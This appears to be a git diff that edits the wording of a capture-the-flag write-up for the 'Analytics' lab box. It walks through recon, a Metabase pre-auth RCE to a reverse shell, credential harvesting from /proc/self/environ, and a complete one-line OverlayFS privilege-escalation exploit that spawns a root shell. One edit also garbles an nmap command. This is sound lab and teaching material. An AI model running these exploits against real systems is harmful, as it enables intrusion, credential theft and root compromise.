@@ -1,18 +1,19 @@
+
 												     ### Analytics Write-up ###
 												--------------------------------------
 
 													Reconnaissance & Scanning
 					--------------------------------------------------------------------------------------------------------------------------------------------------------
- - We start up the machine and get an IP address of 10.10.11.233. We navigate over to the webpage and find that we are not allowed to access the webpage yet. We open up a terminal window and navigate over to our /etc/hosts file and add the IP and Domain name to the file using the command;
+ - We start up the machine and get an IP address of 10.10.11.233. We navigate to the webpage and find that we are not allowed to access the webpage yet. We open up a terminal window, navigate over to our /etc/hosts file, and add the IP and Domain name to the file using the command;
 
  
 	"sudo nano /etc/hosts"
 
-This would open the file and now we can add the IP to the end of our /etc/hosts file and well be able to refresh the page and see what the actual website is hosting. We see that it is an information and resource management page for analytics. We click on all the links within this page and notice its all really just hosted off the same page except for the login page thats redirecting to a new page with a "Dev" prefix. When we navigate over to the login page we realize that it wont load and put it next to our initial Analytics entry and refresh the page and get a login page for the Metabase cloud service.
+This would open the file and after adding the IP to the end of our /etc/hosts file we'll be able to refresh the page and see what the actual website is hosting. We see that it is an information and resource management page for analytics. We click on all the links within this page and notice it's all just hosted off the same page except for the login page redirecting to a new page with a "Dev" prefix. When we navigate over to the login page we realize that it won't load and put it next to our initial Analytics entry and refresh the page and get a login page for the Metabase cloud service.
  
-After initally looking over the webpage and not finding much we set up the terminal we had to open TMUX and proceed to run an Nmap scan using the following;
+After initially looking over the webpage and not finding much we set up the terminal we had to open TMUX and proceed to run an Nmap scan using the following;
 
-	"nmap -sV -sC -Pn -oA Analytics.htb analytical.htb"
+	"Nmap -sV -sC -Pn -oA Analytics. htb analytical.htb"
 
 We get the following result and notice that there is only the webpage being hosted on port 80, and an SSH connection on port 22 with the version "OpenSSH 8.9p1" and "Ubuntu0.4"
 
@@ -33,9 +34,11 @@ ________________________________________________________________________________
 
 	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 	# Nmap done at Fri Dec 29 16:24:37 2023 -- 1 IP address (1 host up) scanned in 15.58 seconds
---------------------------------------------------------------------------------------------------------------------------------------------------------
 
-We also use Gobuster to determine if there are any other hidden directories using the following command and only see the data.analytical.htb url.
+
+					 --------------------------------------------------------------------------------------------------------------------------------------------------------
+
+We also use Gobuster to determine if any other hidden directories are up using the following command and only see the data.analytical.htb url.
 
 	"gobuster dns -d analytical.htb -w /home/d0rian/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -i"
 	
@@ -58,14 +61,14 @@ We also use Gobuster to determine if there are any other hidden directories usin
 	===============================================================
 	
 
-We look up the metabase server and any information in regards to vulnerabilities discovered and come across an article that shows us where we might be able to access any endpoints connected to the webpage and find a vulnerability that was recently discovered discusses a pre-authentication Remote Code Execution Vulnerability that abuses an endpoint under "/api/sessions/properties" which retains the token that we can use to bypass the Metabase login page.
+We look up the Metabase server and any information in regards to vulnerabilities discovered and come across an article that shows us where we might be able to access any endpoints connected to the webpage and find a vulnerability that was recently discovered and discusses a pre-authentication Remote Code Execution Vulnerability that abuses an endpoint under "/api/sessions/properties" which retains the token that we can use to bypass the Metabase login page.
 
-We navigate over to the data.analytical.htb/api/session/properties and find a bunch of text within the browsers webpage that contain the token we are looking for.
+We navigate over to the data.analytical.htb/api/session/properties and find a bunch of text within the browser's webpage that contains the token we are looking for.
 
 	"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
 
 
-We can now use a falsified payload through burpsuites repeater and try to get the page to create a reverse shell computer to our system with the token provided and the RCE vulnerability(Links located at bottom of scanning section) we discovered for metabase too. 
+We can now use a falsified payload through Burpsuites repeater and try to get the page to create a reverse shell computer to our system with the token provided and the RCE vulnerability(Links located at bottom of scanning section) we discovered for metabase too. 
 
  ____________
 | Resources |
@@ -153,10 +156,10 @@ We can now use a falsified payload through burpsuites repeater and try to get th
 
 
 
- - Now that we have the falsified payload finished we can launch up burpsuite and set up Netcat to listen on port 5555 to see if we can make that connection. We go to the login page and set up burpsuite to intercept traffic and send the faek login through to intercept. Once we see it show up on our burpsuite program we grab the packet and send it to the repeater feature. Once we are on the repeater tab of the program we replace the packet with the payload we created and send it through.
+ - Now that we have the falsified payload finished we can launch up burpsuite and set up Netcat to listen on port 5555 to see if we can make that connection. We go to the login page and set up Burpsuite to intercept traffic and send the fake login through to intercept. Once we see it show up on our burpsuite program we grab the packet and send it to the repeater feature. Once we are on the repeater tab of the program we replace the packet with the payload we created and send it through.
 
-- We see that we get a connection on our hosts system in the terminal.
-and are able to now input the commands we want. We proceed to input the command "whoami" to return the user we are currently operating under which returns a Metalytics username. We attempt to use the "sudo -l" and it shows us that we are not allowed to do that. We look around some more within the environment and finally find a file by the name of "environ" within the "/proc/self" directory. We use the "cat" command so that we can see the information stored within that file. We find that it outputs information that also has some SSH credentials we might be able to use.
+- We see that we get a connection on our host system in the terminal.
+and can now input the commands we want. We proceed to input the command "whoami" to return the user we are currently operating under which returns a Metalytics username. We attempt to use the "sudo -l" and it shows us that we are not allowed to do that. We look around some more within the environment and finally find a file by the name of "environ" within the "/proc/self" directory. We use the "cat" command so that we can see the information stored within that file. We find that it outputs information that also has some SSH credentials we might be able to use.
 
 #############################################################################################################
 	SHELL=/bin/sh
@@ -190,24 +193,25 @@ and are able to now input the commands we want. We proceed to input the command 
 	OLDPWD=/home/metabase/.ssh
 #############################################################################################################
 
+
 														Maintaining Access
 									-----------------------------------------------------------------------------------------------------------
- - Now that we have some credentials we try to log in and establish an SSh connection and find that we are succesful using the credentials we found in the "/proc/self/" directory in the environ file. Now that we are inside the SSH service with the Metalytics credentials we use the "ls -la" command to see what is in the current directory and find that we see the first flag. "user.txt". Now that we have the first flag we can focus on some the final area of this box and look for any way we can escalate to root. 
 
- - After some research we find that there is a current vulnerability(CVE-2023-2640, CVE-2023-32629) within the Ubuntu kernel OverlayFS module that allows us to root the non-root directories under certain circumstances using these vulnerabilites. After some more research we find a Github page with a script we can use to execute within the non-root directories(/Metalytics/home/) and attempt to escalate to the root user. 
+ - Now that we have some credentials we try to log in and establish an SSh connection and find that we are successful using the credentials we found in the "/proc/self/" directory in the environ file. Now that we are inside the SSH service with the Metalytics credentials we use the "ls -la" command to see what is in the current directory and find that we see the first flag. "user.txt". Now that we have the first flag we can focus on some of the final section of this box and look for any way we can escalate to root. 
+
+ - After some research, we found that there is a current vulnerability(CVE-2023-2640, CVE-2023-32629) within the Ubuntu kernel OverlayFS module that allows us to root the non-root directories under certain circumstances using these vulnerabilities. After some more research, we found a GitHub page with a script we can use to execute within the non-root directories(/Metalytics/home/) and attempt to escalate to the root user. 
  
- - We navigate over to the "~/home" dir since we have privileges within that directory and use the raw command within the exploit.sh file on the Github page for the vulnerability to execute and give us root. We use the following command within the SSH connection;
+ - We navigate over to the "~/home" dir since we have privileges within that directory and use the raw command within the exploit.sh file on the GitHub page for the vulnerability to execute and give us root. We use the following command within the SSH connection;
  
 
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 
 
 
- - After executing the command we see that the user changes to "root@analytics" and we use the command "whoami" and see the result "root". Remembering that we saw the root directory when traversing around in the network we navigate over to "/root". Once in there we find the last flag for the Challenge. Congrats.
+ - After executing the command we see that the user changes to "root@analytics" and we use the command "whoami" and see the result "root". Remembering that we saw the root directory when traversing around in the network we navigate over to "/root". Once in there, we find the last flag for the Challenge. Congrats.
 
 ____________
 | Resources |
  ------------
  - https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/ (
  - https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 (NON-ROOT to ROOT dir exploit)
- 
